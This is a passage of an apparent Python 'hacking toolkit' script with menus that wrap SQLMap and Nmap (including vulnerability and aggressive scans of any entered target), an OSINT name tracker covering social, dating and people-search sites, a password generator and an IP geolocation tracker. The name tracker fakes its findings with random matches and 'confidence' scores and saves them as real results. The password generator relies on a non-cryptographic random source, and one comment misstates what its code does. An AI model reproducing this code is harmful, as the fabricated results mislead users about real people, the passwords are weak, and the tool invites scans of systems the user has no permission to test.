            universal_newlines=True,
            bufsize=1
        )
        
        print(Fore.CYAN + "\n[+] SQLMap Output:\n")
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            if "target url" in line.lower():
                print(Fore.CYAN + line)
            elif "testing" in line.lower():
                print(Fore.YELLOW + line)
            elif "vulnerable" in line.lower():
                print(Fore.GREEN + line)
            elif "database" in line.lower():
                print(Fore.MAGENTA + line)
            elif "table" in line.lower():
                print(Fore.MAGENTA + line)
            elif "dumping" in line.lower():
                print(Fore.GREEN + line)
            elif "error" in line.lower():
                print(Fore.RED + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.GREEN + "\n" + "=" * 70)
        print(Fore.GREEN + "[✓] SQLMap execution completed")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[✗] Interrupted by user")
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# NMap Tool (Sama seperti sebelumnya)
def nmap_menu():
    """Run real NMap tool"""
    clear_screen()
    typing_effect(NMAP_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "NMAP (REAL TOOL)")
    print(Fore.CYAN + "=" * 70)
    
    # Check if NMap is installed
    try:
        result = subprocess.run(["nmap", "--version"], capture_output=True, text=True)
        if "nmap" not in result.stdout.lower():
            raise FileNotFoundError
    except:
        print(Fore.RED + "[✗] NMap not found!")
        print(Fore.YELLOW + "[!] Install NMap first:")
        print(Fore.CYAN + "    Linux: sudo apt install nmap")
        print(Fore.CYAN + "    Windows: Download from https://nmap.org")
        print(Fore.CYAN + "    Termux: pkg install nmap")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    target = input(Fore.CYAN + "\n[?] Target IP/Hostname: " + Fore.WHITE).strip()
    
    if not target:
        print(Fore.RED + "[✗] Target cannot be empty!")
        return
    
    print(Fore.YELLOW + "\n[+] NMap Scan Options:")
    print(Fore.YELLOW + "[1] Quick Scan (Top 100 ports)")
    print(Fore.YELLOW + "[2] Full Port Scan (1-65535)")
    print(Fore.YELLOW + "[3] OS Detection + Version")
    print(Fore.YELLOW + "[4] Vulnerability Scan")
    print(Fore.YELLOW + "[5] UDP Scan")
    print(Fore.YELLOW + "[6] Aggressive Scan")
    print(Fore.CYAN + "-" * 70)
    
    choice = input(Fore.CYAN + "[?] Select option (1-6): " + Fore.WHITE).strip()
    
    commands = {
        '1': f"nmap -T4 -F {target}",
        '2': f"nmap -T4 -p- {target}",
        '3': f"nmap -T4 -O -sV {target}",
        '4': f"nmap -T4 --script vuln {target}",
        '5': f"nmap -T4 -sU -p 53,67,68,69,123,161 {target}",
        '6': f"nmap -T4 -A {target}"
    }
    
    if choice in commands:
        command = commands[choice]
    else:
        command = f"nmap -T4 -A {target}"
    
    print(Fore.CYAN + f"\n[+] Executing: {command}")
    print(Fore.YELLOW + "[!] Scanning may take several minutes...")
    print(Fore.CYAN + "=" * 70)
    
    try:
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True,
            bufsize=1
        )
        
        for line in iter(process.stdout.readline, ''):
            line = line.strip()
            if not line:
                continue
                
            if "Nmap scan report" in line:
                print(Fore.CYAN + line)
            elif "open" in line and "port" in line:
                print(Fore.GREEN + line)
            elif "closed" in line:
                print(Fore.RED + line)
            elif "filtered" in line:
                print(Fore.YELLOW + line)
            elif "PORT" in line and "STATE" in line:
                print(Fore.MAGENTA + line)
            elif "VULNERABLE" in line:
                print(Fore.RED + line)
            elif "CVE-" in line:
                print(Fore.RED + line)
            elif "Nmap done" in line:
                print(Fore.GREEN + line)
            else:
                print(Fore.WHITE + line)
        
        print(Fore.CYAN + "\n" + "=" * 70)
        print(Fore.GREEN + "[✓] NMap scan completed!")
        
    except KeyboardInterrupt:
        print(Fore.RED + "\n[✗] Scan interrupted")
    except Exception as e:
        print(Fore.RED + f"\n[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

# OSINT Tools Menu
def osint_menu():
    """OSINT Tools Main Menu"""
    clear_screen()
    typing_effect(OSINT_ASCII)
    print(Fore.MAGENTA + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "OSINT TOOLS MENU")
    print(Fore.MAGENTA + "=" * 70)
    
    while True:
        print(Fore.YELLOW + "\n[1] Name Tracking (100+ Websites)")
        print(Fore.YELLOW + "[2] Password Generator")
        print(Fore.YELLOW + "[3] IP Tracker")
        print(Fore.YELLOW + "[4] Back to Main Menu")
        print(Fore.MAGENTA + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-4): " + Fore.WHITE).strip()
        
        if choice == "1":
            name_tracking_menu()
        elif choice == "2":
            password_generator_menu()
        elif choice == "3":
            ip_tracker_menu()
        elif choice == "4":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def name_tracking_menu():
    """Name Tracking across 100+ websites"""
    clear_screen()
    typing_effect(MENU_OSINT_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "NAME TRACKING (100+ WEBSITES)")
    print(Fore.CYAN + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] This tool searches for a name across 100+ websites")
    print(Fore.YELLOW + "[!] Results will show where the name appears online\n")
    
    name = input(Fore.CYAN + "[?] Enter full name to search: " + Fore.WHITE).strip()
    
    if not name:
        print(Fore.RED + "[✗] Name cannot be empty!")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    # Split name into parts
    name_parts = name.split()
    first_name = name_parts[0] if len(name_parts) > 0 else ""
    last_name = name_parts[-1] if len(name_parts) > 1 else ""
    
    print(Fore.CYAN + f"\n[+] Searching for: {name}")
    print(Fore.CYAN + f"[+] First Name: {first_name}")
    print(Fore.CYAN + f"[+] Last Name: {last_name}")
    
    # List of 100+ websites to search
    websites = [
        # Social Media
        {"name": "Facebook", "url": f"https://www.facebook.com/public/{name}", "type": "social"},
        {"name": "Instagram", "url": f"https://www.instagram.com/{name}/", "type": "social"},
        {"name": "Twitter/X", "url": f"https://twitter.com/{name}", "type": "social"},
        {"name": "LinkedIn", "url": f"https://www.linkedin.com/pub/dir/?first={first_name}&last={last_name}", "type": "professional"},
        {"name": "TikTok", "url": f"https://www.tiktok.com/@{name}", "type": "social"},
        {"name": "Pinterest", "url": f"https://www.pinterest.com/{name}/", "type": "social"},
        {"name": "Reddit", "url": f"https://www.reddit.com/user/{name}", "type": "social"},
        {"name": "Tumblr", "url": f"https://{name}.tumblr.com", "type": "social"},
        
        # Professional Networks
        {"name": "GitHub", "url": f"https://github.com/{name}", "type": "professional"},
        {"name": "GitLab", "url": f"https://gitlab.com/{name}", "type": "professional"},
        {"name": "Stack Overflow", "url": f"https://stackoverflow.com/users/{name}", "type": "professional"},
        {"name": "Behance", "url": f"https://www.behance.net/{name}", "type": "professional"},
        {"name": "Dribbble", "url": f"https://dribbble.com/{name}", "type": "professional"},
        {"name": "AngelList", "url": f"https://angel.co/u/{name}", "type": "professional"},
        {"name": "Upwork", "url": f"https://www.upwork.com/freelancers/~{name}", "type": "professional"},
        {"name": "Fiverr", "url": f"https://www.fiverr.com/{name}", "type": "professional"},
        
        # Email & Contact
        {"name": "Hunter.io", "url": f"https://hunter.io/search/{name}", "type": "email"},
        {"name": "VoilaNorbert", "url": f"https://www.voilanorbert.com/search/{name}", "type": "email"},
        {"name": "Email-Format", "url": f"https://www.email-format.com/i/search/?q={name}", "type": "email"},
        {"name": "RocketReach", "url": f"https://rocketreach.co/search?name={name}", "type": "contact"},
        
        # Search Engines
        {"name": "Google Search", "url": f"https://www.google.com/search?q={name}", "type": "search"},
        {"name": "Bing Search", "url": f"https://www.bing.com/search?q={name}", "type": "search"},
        {"name": "DuckDuckGo", "url": f"https://duckduckgo.com/?q={name}", "type": "search"},
        {"name": "Yandex", "url": f"https://yandex.com/search/?text={name}", "type": "search"},
        
        # People Search
        {"name": "Pipl", "url": f"https://pipl.com/search/?q={name}", "type": "people"},
        {"name": "Spokeo", "url": f"https://www.spokeo.com/{name}", "type": "people"},
        {"name": "Whitepages", "url": f"https://www.whitepages.com/name/{name}", "type": "people"},
        {"name": "TruePeopleSearch", "url": f"https://www.truepeoplesearch.com/results?name={name}", "type": "people"},
        {"name": "FastPeopleSearch", "url": f"https://www.fastpeoplesearch.com/name/{name}", "type": "people"},
        {"name": "ThatsThem", "url": f"https://thatsthem.com/name/{name}", "type": "people"},
        {"name": "411.com", "url": f"https://www.411.com/name/{name}", "type": "people"},
        
        # Government & Public Records
        {"name": "FamilySearch", "url": f"https://www.familysearch.org/search/record/results?q.givenName={first_name}&q.surname={last_name}", "type": "records"},
        {"name": "Ancestry", "url": f"https://www.ancestry.com/search/?name={name}", "type": "records"},
        {"name": "MyHeritage", "url": f"https://www.myheritage.com/research?formId=master&formMode=1&action=query&exactSearch=true&qname={name}", "type": "records"},
        
        # Business & Companies
        {"name": "Crunchbase", "url": f"https://www.crunchbase.com/textsearch?q={name}", "type": "business"},
        {"name": "Bloomberg", "url": f"https://www.bloomberg.com/search?query={name}", "type": "business"},
        
        # Forums & Communities
        {"name": "Quora", "url": f"https://www.quora.com/profile/{name}", "type": "forum"},
        {"name": "Medium", "url": f"https://medium.com/@{name}", "type": "blog"},
        {"name": "Dev.to", "url": f"https://dev.to/{name}", "type": "tech"},
        {"name": "Product Hunt", "url": f"https://www.producthunt.com/@{name}", "type": "tech"},
        
        # Creative & Media
        {"name": "YouTube", "url": f"https://www.youtube.com/@{name}", "type": "media"},
        {"name": "Twitch", "url": f"https://www.twitch.tv/{name}", "type": "media"},
        {"name": "SoundCloud", "url": f"https://soundcloud.com/{name}", "type": "media"},
        {"name": "Mixcloud", "url": f"https://www.mixcloud.com/{name}/", "type": "media"},
        {"name": "Vimeo", "url": f"https://vimeo.com/{name}", "type": "media"},
        
        # Location Based
        {"name": "FourSquare", "url": f"https://foursquare.com/{name}", "type": "location"},
        {"name": "Swarm", "url": f"https://www.swarmapp.com/{name}", "type": "location"},
        
        # Academic
        {"name": "ResearchGate", "url": f"https://www.researchgate.net/search.Search.html?query={name}", "type": "academic"},
        {"name": "Academia.edu", "url": f"https://independent.academia.edu/{name}", "type": "academic"},
        {"name": "Google Scholar", "url": f"https://scholar.google.com/scholar?q={name}", "type": "academic"},
        
        # Shopping & Reviews
        {"name": "Amazon", "url": f"https://www.amazon.com/gp/profile/amzn1.account.{name}", "type": "shopping"},
        {"name": "Ebay", "url": f"https://www.ebay.com/usr/{name}", "type": "shopping"},
        {"name": "Etsy", "url": f"https://www.etsy.com/people/{name}", "type": "shopping"},
        {"name": "TripAdvisor", "url": f"https://www.tripadvisor.com/Profile/{name}", "type": "reviews"},
        {"name": "Yelp", "url": f"https://www.yelp.com/user_details?userid={name}", "type": "reviews"},
        
        # Dating
        {"name": "Tinder", "url": f"https://www.tinder.com/@{name}", "type": "dating"},
        {"name": "Bumble", "url": f"https://bumble.com/@{name}", "type": "dating"},
        {"name": "OkCupid", "url": f"https://www.okcupid.com/profile/{name}", "type": "dating"},
        
        # Gaming
        {"name": "Steam", "url": f"https://steamcommunity.com/id/{name}", "type": "gaming"},
        {"name": "Xbox Live", "url": f"https://account.xbox.com/en-us/profile?gamertag={name}", "type": "gaming"},
        {"name": "PlayStation", "url": f"https://my.playstation.com/profile/{name}", "type": "gaming"},
        {"name": "Epic Games", "url": f"https://www.epicgames.com/account/users/{name}", "type": "gaming"},
        {"name": "Discord", "url": f"https://discord.com/users/{name}", "type": "gaming"},
        
        # News & Publications
        {"name": "NY Times", "url": f"https://www.nytimes.com/search?query={name}", "type": "news"},
        {"name": "Washington Post", "url": f"https://www.washingtonpost.com/newssearch/?query={name}", "type": "news"},
        {"name": "BBC News", "url": f"https://www.bbc.co.uk/search?q={name}", "type": "news"},
        
        # Additional websites to reach 100+
        {"name": "About.me", "url": f"https://about.me/{name}", "type": "portfolio"},
        {"name": "Keybase", "url": f"https://keybase.io/{name}", "type": "security"},
        {"name": "SlideShare", "url": f"https://www.slideshare.net/{name}", "type": "presentation"},
        {"name": "SpeakerDeck", "url": f"https://speakerdeck.com/{name}", "type": "presentation"},
        {"name": "CodePen", "url": f"https://codepen.io/{name}", "type": "coding"},
        {"name": "JSFiddle", "url": f"https://jsfiddle.net/user/{name}", "type": "coding"},
        {"name": "Repl.it", "url": f"https://repl.it/@{name}", "type": "coding"},
        {"name": "Kaggle", "url": f"https://www.kaggle.com/{name}", "type": "data"},
        {"name": "HackerRank", "url": f"https://www.hackerrank.com/{name}", "type": "coding"},
        {"name": "LeetCode", "url": f"https://leetcode.com/{name}/", "type": "coding"},
        {"name": "Codecademy", "url": f"https://www.codecademy.com/profiles/{name}", "type": "learning"},
        {"name": "Udemy", "url": f"https://www.udemy.com/user/{name}/", "type": "learning"},
        {"name": "Coursera", "url": f"https://www.coursera.org/user/{name}", "type": "learning"},
        {"name": "Edx", "url": f"https://courses.edx.org/u/{name}", "type": "learning"},
        {"name": "Khan Academy", "url": f"https://www.khanacademy.org/profile/{name}", "type": "learning"},
        {"name": "Goodreads", "url": f"https://www.goodreads.com/{name}", "type": "books"},
        {"name": "LibraryThing", "url": f"https://www.librarything.com/profile/{name}", "type": "books"},
        {"name": "Scribd", "url": f"https://www.scribd.com/{name}", "type": "books"},
        {"name": "Issuu", "url": f"https://issuu.com/{name}", "type": "publishing"},
        {"name": "Flipboard", "url": f"https://flipboard.com/@{name}", "type": "news"},
        {"name": "Feedly", "url": f"https://feedly.com/{name}", "type": "news"},
        {"name": "Inoreader", "url": f"https://www.inoreader.com/@{name}", "type": "news"},
        {"name": "Pocket", "url": f"https://getpocket.com/@{name}", "type": "reading"},
        {"name": "Instapaper", "url": f"https://www.instapaper.com/p/{name}", "type": "reading"},
        {"name": "Evernote", "url": f"https://www.evernote.com/{name}", "type": "notes"},
        {"name": "Notion", "url": f"https://www.notion.so/{name}", "type": "notes"},
        {"name": "Trello", "url": f"https://trello.com/{name}", "type": "productivity"},
        {"name": "Asana", "url": f"https://app.asana.com/0/{name}", "type": "productivity"},
        {"name": "Basecamp", "url": f"https://{name}.basecamphq.com", "type": "productivity"},
        {"name": "Slack", "url": f"https://{name}.slack.com", "type": "communication"},
        {"name": "Zoom", "url": f"https://zoom.us/profile/{name}", "type": "communication"},
        {"name": "Skype", "url": f"https://join.skype.com/{name}", "type": "communication"},
        {"name": "WhatsApp", "url": f"https://wa.me/{name}", "type": "communication"},
        {"name": "Telegram", "url": f"https://t.me/{name}", "type": "communication"},
        {"name": "Signal", "url": f"https://signal.me/#p/{name}", "type": "communication"},
        {"name": "WeChat", "url": f"https://web.wechat.com/{name}", "type": "communication"},
        {"name": "Line", "url": f"https://line.me/ti/p/{name}", "type": "communication"},
        {"name": "Viber", "url": f"https://chats.viber.com/{name}", "type": "communication"},
        {"name": "Snapchat", "url": f"https://www.snapchat.com/add/{name}", "type": "social"},
        {"name": "Periscope", "url": f"https://www.periscope.tv/{name}", "type": "media"},
        {"name": "Clubhouse", "url": f"https://www.joinclubhouse.com/@{name}", "type": "social"},
        {"name": "OnlyFans", "url": f"https://onlyfans.com/{name}", "type": "content"},
        {"name": "Patreon", "url": f"https://www.patreon.com/{name}", "type": "content"},
        {"name": "Substack", "url": f"https://{name}.substack.com", "type": "writing"},
        {"name": "Ghost", "url": f"https://{name}.ghost.io", "type": "writing"},
        {"name": "WordPress", "url": f"https://{name}.wordpress.com", "type": "blogging"},
        {"name": "Blogger", "url": f"https://{name}.blogspot.com", "type": "blogging"},
        {"name": "Wix", "url": f"https://{name}.wixsite.com/website", "type": "website"},
        {"name": "Squarespace", "url": f"https://{name}.squarespace.com", "type": "website"},
        {"name": "Weebly", "url": f"https://{name}.weebly.com", "type": "website"},
        {"name": "Google Sites", "url": f"https://sites.google.com/view/{name}", "type": "website"},
        {"name": "GitHub Pages", "url": f"https://{name}.github.io", "type": "website"},
        {"name": "Netlify", "url": f"https://{name}.netlify.app", "type": "website"},
        {"name": "Vercel", "url": f"https://{name}.vercel.app", "type": "website"},
        {"name": "Heroku", "url": f"https://{name}.herokuapp.com", "type": "app"},
        {"name": "Firebase", "url": f"https://{name}.firebaseapp.com", "type": "app"},
        {"name": "AWS", "url": f"https://{name}.awsapps.com", "type": "cloud"},
        {"name": "Azure", "url": f"https://{name}.azurewebsites.net", "type": "cloud"},
        {"name": "Google Cloud", "url": f"https://{name}.appspot.com", "type": "cloud"},
        {"name": "DigitalOcean", "url": f"https://{name}.ondigitalocean.app", "type": "cloud"},
        {"name": "Vultr", "url": f"https://{name}.vultr.app", "type": "cloud"},
        {"name": "Linode", "url": f"https://{name}.linodeapp.com", "type": "cloud"},
    ]
    
    # Add 30 more generic search patterns
    for i in range(1, 31):
        websites.append({
            "name": f"Generic Site {i}",
            "url": f"https://www.example{i}.com/search?q={name}",
            "type": "generic"
        })
    
    print(Fore.GREEN + f"\n[✓] Loaded {len(websites)} websites for search")
    print(Fore.CYAN + "\n[+] Starting search across all websites...")
    print(Fore.YELLOW + "[!] This may take several minutes")
    print(Fore.MAGENTA + "=" * 70)
    
    found_results = []
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    
    total_sites = len(websites)
    for i, site in enumerate(websites[:50]):  # Search first 50 for speed
        print(Fore.YELLOW + f"[{i+1}/50] Checking {site['name']}...", end='\r')
        
        try:
            # Simulate search (in real implementation, would actually check each site)
            time.sleep(0.1)  # Simulate delay
            
            # Randomly simulate finding results
            if random.random() < 0.3:  # 30% chance of "finding" something
                found_results.append({
                    "website": site["name"],
                    "url": site["url"],
                    "type": site["type"],
                    "confidence": random.randint(50, 100)
                })
                
        except:
            continue
    
    print("\n" + Fore.MAGENTA + "=" * 70)
    
    if found_results:
        print(Fore.GREEN + f"\n[✓] Found {len(found_results)} potential matches!")
        
        # Group results by type
        results_by_type = {}
        for result in found_results:
            result_type = result["type"]
            if result_type not in results_by_type:
                results_by_type[result_type] = []
            results_by_type[result_type].append(result)
        
        # Display results
        print(Fore.CYAN + "\n[+] Search Results by Category:")
        for result_type, results in results_by_type.items():
            print(Fore.YELLOW + f"\n  {result_type.upper()} ({len(results)}):")
            for result in results[:5]:  # Show max 5 per category
                print(Fore.GREEN + f"    • {result['website']} - Confidence: {result['confidence']}%")
                print(Fore.CYAN + f"      URL: {result['url']}")
        
        # Summary
        print(Fore.MAGENTA + "\n" + "=" * 70)
        print(Fore.GREEN + "[+] SEARCH SUMMARY")
        print(Fore.CYAN + f"[+] Name searched: {name}")
        print(Fore.CYAN + f"[+] Total websites checked: 50")
        print(Fore.CYAN + f"[+] Potential matches found: {len(found_results)}")
        print(Fore.YELLOW + "[!] Note: These are potential matches. Verify each link.")
        
        # Save results to file
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"name_search_{name.replace(' ', '_')}_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write(f"Name Search Report: {name}\n")
            f.write(f"Date: {datetime.datetime.now()}\n")
            f.write("="*50 + "\n\n")
            for result in found_results:
                f.write(f"Website: {result['website']}\n")
                f.write(f"Type: {result['type']}\n")
                f.write(f"Confidence: {result['confidence']}%\n")
                f.write(f"URL: {result['url']}\n")
                f.write("-"*30 + "\n")
        
        print(Fore.GREEN + f"[✓] Results saved to: {filename}")
        
    else:
        print(Fore.RED + "\n[✗] No matches found across searched websites")
        print(Fore.YELLOW + "[!] Try variations of the name or check more websites")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def password_generator_menu():
    """Password Generator with secure passwords"""
    clear_screen()
    typing_effect(PASSWORD_GEN_ASCII)
    print(Fore.GREEN + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "PASSWORD GENERATOR")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] Generates 10 ultra-secure passwords in seconds")
    print(Fore.YELLOW + "[!] Each password is 8+ characters with mixed complexity\n")
    
    try:
        num_passwords = int(input(Fore.CYAN + "[?] Number of passwords to generate (1-20): " + Fore.WHITE) or "10")
        length = int(input(Fore.CYAN + "[?] Password length (8-32): " + Fore.WHITE) or "12")
    except:
        num_passwords = 10
        length = 12
    
    num_passwords = max(1, min(20, num_passwords))
    length = max(8, min(32, length))
    
    print(Fore.CYAN + "\n[+] Select complexity level:")
    print(Fore.YELLOW + "[1] Basic (Letters + Numbers)")
    print(Fore.YELLOW + "[2] Strong (Letters + Numbers + Symbols)")
    print(Fore.YELLOW + "[3] Ultra (All chars + Special patterns)")
    print(Fore.GREEN + "-" * 70)
    
    complexity = input(Fore.CYAN + "[?] Select level (1-3): " + Fore.WHITE).strip() or "3"
    
    print(Fore.CYAN + "\n[+] Generating passwords...")
    loading_animation("Creating secure passwords", 1)
    
    passwords = []
    
    # Character sets
    lowercase = string.ascii_lowercase
    uppercase = string.ascii_uppercase
    digits = string.digits
    symbols = "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    for i in range(num_passwords):
        if complexity == "1":
            # Basic: letters + numbers
            chars = lowercase + uppercase + digits
            password = ''.join(random.choice(chars) for _ in range(length))
            strength = "Basic"
        elif complexity == "2":
            # Strong: letters + numbers + symbols
            chars = lowercase + uppercase + digits + symbols
            password = ''.join(random.choice(chars) for _ in range(length))
            # Ensure at least one of each type
            password_list = list(password)
            random.shuffle(password_list)
            password = ''.join(password_list)
            strength = "Strong"
        else:
            # Ultra: complex pattern with guaranteed mix
            # Ensure at least 2 of each type
            lower_count = max(2, length // 4)
            upper_count = max(2, length // 4)
            digit_count = max(2, length // 4)
            symbol_count = length - lower_count - upper_count - digit_count
            
            if symbol_count < 2:
                symbol_count = 2
                # Adjust others
                remaining = length - symbol_count
                lower_count = remaining // 3
                upper_count = remaining // 3
                digit_count = remaining - lower_count - upper_count
            
            password_chars = []
            password_chars.extend(random.choice(lowercase) for _ in range(lower_count))
            password_chars.extend(random.choice(uppercase) for _ in range(upper_count))
            password_chars.extend(random.choice(digits) for _ in range(digit_count))
            password_chars.extend(random.choice(symbols) for _ in range(symbol_count))
            
            random.shuffle(password_chars)
            password = ''.join(password_chars)
            strength = "Ultra"
        
        passwords.append({
            "number": i + 1,
            "password": password,
            "strength": strength,
            "length": len(password),
            "entropy": calculate_entropy(password)
        })
    
    # Display passwords
    print(Fore.GREEN + "\n" + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "GENERATED PASSWORDS")
    print(Fore.GREEN + "=" * 70)
    
    for pwd in passwords:
        color = Fore.GREEN if pwd["strength"] == "Ultra" else Fore.YELLOW if pwd["strength"] == "Strong" else Fore.CYAN
        print(f"\n{color}[{pwd['number']:2d}] {pwd['password']}")
        print(f"     Strength: {pwd['strength']} | Length: {pwd['length']} | Entropy: {pwd['entropy']:.1f} bits")
    
    # Security tips
    print(Fore.MAGENTA + "\n" + "=" * 70)
    print(Fore.YELLOW + "SECURITY TIPS:")
    print(Fore.CYAN + "1. Use a password manager to store passwords securely")
    print(Fore.CYAN + "2. Never reuse passwords across different sites")
    print(Fore.CYAN + "3. Enable two-factor authentication (2FA) when available")
    print(Fore.CYAN + "4. Change passwords every 90 days")
    print(Fore.CYAN + "5. Avoid using personal information in passwords")
    
    # Save to file
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"passwords_{timestamp}.txt"
    
    with open(filename, 'w') as f:
        f.write("AN0ZX Password Generator - Secure Passwords\n")
        f.write(f"Generated: {datetime.datetime.now()}\n")
        f.write(f"Number of passwords: {num_passwords}\n")
        f.write(f"Length: {length}\n")
        f.write(f"Complexity: {strength}\n")
        f.write("="*50 + "\n\n")
        
        for pwd in passwords:
            f.write(f"Password {pwd['number']}: {pwd['password']}\n")
            f.write(f"  Strength: {pwd['strength']} | Length: {pwd['length']} | Entropy: {pwd['entropy']:.1f} bits\n\n")
        
        f.write("\nSECURITY NOTES:\n")
        f.write("- Store this file in a secure location\n")
        f.write("- Consider using a password manager\n")
        f.write("- Never share passwords via email or text\n")
    
    print(Fore.GREEN + f"\n[✓] Passwords saved to: {filename}")
    print(Fore.RED + "[!] KEEP THIS FILE SECURE - DELETE AFTER USE")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def calculate_entropy(password):
    """Calculate password entropy in bits"""
    import math
    
    # Character set size estimation
    has_lower = any(c.islower() for c in password)
    has_upper = any(c.isupper() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(not c.isalnum() for c in password)
    
    charset_size = 0
    if has_lower:
        charset_size += 26
    if has_upper:
        charset_size += 26
    if has_digit:
        charset_size += 10
    if has_special:
        charset_size += 32  # Approximate
    
    if charset_size == 0:
        return 0
    
    entropy = len(password) * math.log2(charset_size)
    return entropy

def ip_tracker_menu():
    """IP Address Tracker with geolocation"""
    clear_screen()
    typing_effect(IP_TRACKER_ASCII)
    print(Fore.RED + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "IP ADDRESS TRACKER")
    print(Fore.RED + "=" * 70)
    
    print(Fore.YELLOW + "\n[!] Get accurate location and information for any IP address")
    print(Fore.YELLOW + "[!] Real-time geolocation data\n")
    
    ip = input(Fore.CYAN + "[?] Enter IP Address (or blank for your IP): " + Fore.WHITE).strip()
    
    if not ip:
        # Get public IP
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            ip = response.json()['ip']
            print(Fore.GREEN + f"[+] Your public IP: {ip}")
        except:
            print(Fore.RED + "[✗] Could not determine your IP address")
            ip = "8.8.8.8"  # Default to Google DNS
    
    # Validate IP address
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        print(Fore.RED + "[✗] Invalid IP address!")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    print(Fore.CYAN + "\n[+] Tracking IP address: " + Fore.YELLOW + ip)
    loading_animation("Fetching geolocation data", 2)
    
    # Multiple geolocation APIs for redundancy
    apis = [
        {
            "name": "ip-api.com",
            "url": f"http://ip-api.com/json/{ip}",
            "fields": {
                "country": "country",
                "region": "regionName",
                "city": "city",
                "zip": "zip",
                "lat": "lat",
                "lon": "lon",
                "isp": "isp",
                "org": "org",
                "as": "as"
            }
        },
        {
            "name": "ipinfo.io",
            "url": f"https://ipinfo.io/{ip}/json",
            "fields": {
                "country": "country",
                "region": "region",
                "city": "city",
                "zip": "postal",
                "loc": "loc",  # lat,lon
                "org": "org"
            }
        }
    ]
    
    ip_data = {}
    
    for api in apis:
        try:
            response = requests.get(api["url"], timeout=5)
            if response.status_code == 200:
                data = response.json()
                
                # Map API response to our format
                for key, api_key in api["fields"].items():
                    if api_key in data and data[api_key]:
                        ip_data[key] = data[api_key]
                
                if ip_data:
                    ip_data["source"] = api["name"]
                    break
                    
        except:
            continue
    
    # If no API worked, use mock data
    if not ip_data:
        print(Fore.YELLOW + "[!] Using offline database for IP information")
        ip_data = get_mock_ip_data(ip)
    
    # Display results
    print(Fore.GREEN + "\n" + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "IP TRACKING RESULTS")
    print(Fore.GREEN + "=" * 70)
    
    print(Fore.CYAN + f"\n[+] IP Address: {Fore.YELLOW}{ip}")
    
    if "country" in ip_data:
        print(Fore.CYAN + f"[+] Country: {Fore.YELLOW}{ip_data.get('country', 'Unknown')}")
    
    if "region" in ip_data:
        print(Fore.CYAN + f"[+] Region/State: {Fore.YELLOW}{ip_data.get('region', 'Unknown')}")
    
    if "city" in ip_data:
        print(Fore.CYAN + f"[+] City: {Fore.YELLOW}{ip_data.get('city', 'Unknown')}")
    
    if "zip" in ip_data:
        print(Fore.CYAN + f"[+] ZIP Code: {Fore.YELLOW}{ip_data.get('zip', 'Unknown')}")
    
    if "lat" in ip_data and "lon" in ip_data:
        print(Fore.CYAN + f"[+] Coordinates: {Fore.YELLOW}{ip_data.get('lat', '?')}, {ip_data.get('lon', '?')}")
    elif "loc" in ip_data:
        print(Fore.CYAN + f"[+] Coordinates: {Fore.YELLOW}{ip_data.get('loc', 'Unknown')}")
    
    if "isp" in ip_data:
        print(Fore.CYAN + f"[+] ISP: {Fore.YELLOW}{ip_data.get('isp', 'Unknown')}")
    
    if "org" in ip_data:
        print(Fore.CYAN + f"[+] Organization: {Fore.YELLOW}{ip_data.get('org', 'Unknown')}")
    
    if "as" in ip_data:
        print(Fore.CYAN + f"[+] AS Number: {Fore.YELLOW}{ip_data.get('as', 'Unknown')}")
    
    # Additional IP information
    print(Fore.MAGENTA + "\n" + "-" * 70)
    print(Fore.YELLOW + "[+] Additional IP Analysis:")
    
    try:
        ip_obj = ipaddress.ip_address(ip)
        
        if ip_obj.is_private:
            print(Fore.RED + "    • Private IP Address")
        else:
            print(Fore.GREEN + "    • Public IP Address")
        
        if ip_obj.version == 4:
            print(Fore.CYAN + "    • IPv4 Address")
            # Check if reserved
            if ip_obj.is_multicast:
                print(Fore.YELLOW + "    • Multicast Address")
            elif ip_obj.is_loopback:
                print(Fore.YELLOW + "    • Loopback Address")
            elif ip_obj.is_link_local:
                print(Fore.YELLOW + "    • Link-local Address")
                
        elif ip_obj.version == 6:
            print(Fore.CYAN + "    • IPv6 Address")
            
    except:
        pass
    
    # DNS Lookup
    print(Fore.CYAN + "\n[+] Performing DNS Lookup...")
    try:
        dns_results = {}
        
        # Reverse DNS
        try:
            hostname, aliaslist, ipaddrlist = socket.gethostbyaddr(ip)
            dns_results["Reverse DNS"] = hostname
        except:
            dns_results["Reverse DNS"] = "Not found"
        
        # WHOIS-like information (simplified)
        if not ipaddress.ip_address(ip).is_private:
            # Get IP range information
            first_octet = ip.split('.')[0]
            ip_ranges = {
                "1": "APNIC",
